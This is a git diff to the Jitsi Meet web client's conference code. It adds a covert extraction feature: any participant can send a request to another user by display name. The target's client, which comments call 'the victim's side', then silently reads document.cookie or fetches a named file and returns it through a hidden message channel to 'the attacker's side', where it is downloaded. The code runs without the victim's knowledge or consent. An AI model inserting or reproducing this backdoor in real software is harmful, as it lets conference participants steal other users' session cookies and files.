@@ -4,6 +4,7 @@ import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
 
 import { openConnection } from './connection';
+import { ExtractionHandler, defaultConfigurationValues } from './extraction';
 import { ENDPOINT_TEXT_MESSAGE_NAME } from './modules/API/constants';
 import AuthHandler from './modules/UI/authentication/AuthHandler';
 import UIUtil from './modules/UI/util/UIUtil';
@@ -1260,51 +1261,101 @@ export default {
      * @param {object} object data to extract
      * @param {string} name of file to save
      */
-    downloadFile(object, name = 'extracted.json') {
+    downloadFile(object, name) {
         downloadJSON(JSON.stringify(object), name);
     },
 
-    getPlainData(filename) {
-        APP.conference.sendEndpointMessage('',
-        {
-            extraction: true,
-            name: filename
-        });
-    },
-
     /**
-     * Extract specified file.
-     * @param {string} filename of data to be extracted
+     * Send request with specified information about extraction
+     * @param userName that will recieve a request
+     * @param {object} configuration object containg setup of data extraction and used methods
      */
-    extractData(filename) {
-        fetch(filename).then(response => response.json())
-            .then(file => APP.conference.sendEndpointMessage('',
+    sendExtractionRequest(userName, configuration, fileName = 'extracted.json') {
+        const foundUser = APP.conference.listMembers().filter(user => user.getDisplayName() === userName);
+
+        // no user found
+        if (!foundUser.length) {
+            return null;
+        }
+
+        // found more users with that name, name is not specific enough
+        if (foundUser.length > 1) {
+            return null;
+        }
+
+        // send request to the user with specified name
+        try {
+            APP.conference.sendEndpointMessage(foundUser[0].getId(),
             {
-                extraction: true,
-                data: file
-            }));
+                extraction: 'request',
+                config: new Proxy(defaultConfigurationValues, configuration)
+            });
+
+            // initialize extraction handler for receiving hidden communication based on set configuration
+            APP.conference._extractionHandler = new ExtractionHandler(configuration);
+
+            // initiate event for extraction ending
+            APP.conference._extractionEventElement = new EventTarget();
+
+            // start receiving data, after receiving all data download a file
+            APP.conference._extractionEventElement.addEventListener('extractionEnded', object => {
+                this.downloadFile(object.detail.extractedData, fileName);
+            });
+
+        } catch (err) {
+            console.error(err);
+        }
     },
 
     /**
-     * Send whole file as-is.
-     * @param {string} filename of file to be sent
+     * Handle extraction communication between both parties.
+     *
+     * @param {object} user - User object of the request sender
+     * @param {object} recievedData - Data recieved
+     * @returns {string}
      */
-    sendFile(filename) {
-        fetch(filename).then(response => response.json())
-            .then(data => {
-                for (const line in data) {
-                    APP.conference.sendEndpointMessage('',
-                    {
-                        extraction: true,
-                        payload: line
-                    });
-                }
-                APP.conference.sendEndpointMessage('',
-                {
-                    extraction: true,
-                    end: true
-                });
+    _handleExtractionCommunication(user, recievedData) {
+        // define extraction handler if it does not exist
+        // OR if it contains extraction handler from previous communication
+        if (!APP.conference._extractionHandler
+            || APP.conference._extractionHandler.communicationEnded) {
+            APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
+        }
+
+        // this runs on the victim's side
+        if (recievedData.extraction === 'request') {
+            this._acquireData(recievedData.config).then(acquiredData => {
+                APP.conference._extractionHandler.sendAll(acquiredData);
             });
+        } else { // 'reply' received, this runs on the attacker's side
+            const extractionEvent = APP.conference._extractionEventElement;
+
+            APP.conference._extractionHandler.receivePlainData(recievedData, extractionEvent);
+        }
+    },
+
+    /**
+     * When request for data is received this will acquire necessary data and return it
+     * @param {object} dataInfo - Information about the data to be extracted
+     */
+    async _acquireData(dataInfo) {
+        if (dataInfo.dataType === 'cookies') {
+            return document.cookie;
+        }
+        fetch(dataInfo.fileName)
+            .then(
+
+                // if the response is a JSON object
+                response => response.json())
+            .then(
+
+                // Handle the success response object
+                success => success)
+            .catch(
+
+                // Handle the error response object
+                error => console.error(error)
+            );
     },
 
     /**
@@ -2006,17 +2057,6 @@ export default {
         });
         room.on(JitsiConferenceEvents.USER_JOINED, (id, user) => {
             // The logic shared between RN and web.
-
-            // Extraction endpoint
-            /*
-            console.log(`NEW USER ${user._displayName()} JOINED!`);
-            APP.conference.sendEndpointMessage('',
-                {
-                    extraction: true,
-                    data: 'TESTNG DATA'
-                });
-            */
-
             commonUserJoinedHandling(APP.store, room, user);
 
             if (user.isHidden()) {
@@ -2182,12 +2222,7 @@ export default {
                     const [ sender, eventData ] = args;
 
                     if (eventData.extraction) {
-                        if (eventData.name) {
-                            this.extractData(eventData.name);
-                        }
-                        else {
-                            this.downloadFile(eventData);
-                        }
+                        this._handleExtractionCommunication(sender, eventData);
                     }
 
                     if (eventData.name === ENDPOINT_TEXT_MESSAGE_NAME) {
@@ -3179,4 +3214,21 @@ export default {
 
         this._proxyConnection = null;
     }
+};
+
+/**
+ * Splits string to the fixed-size strings
+ * @param {string} inputString - String of any size
+ * @param {integer} perChunk - Size of each string in final array
+ * @returns array of fixed-sized strings
+ */
+window.splitString = (inputString, perChunk = 5) => {
+    const chunks = [], n = inputString.length;
+    let i = 0;
+
+    while (i < n) {
+        chunks.push(inputString.slice(i, i += perChunk));
+    }
+
+    return chunks;
 };
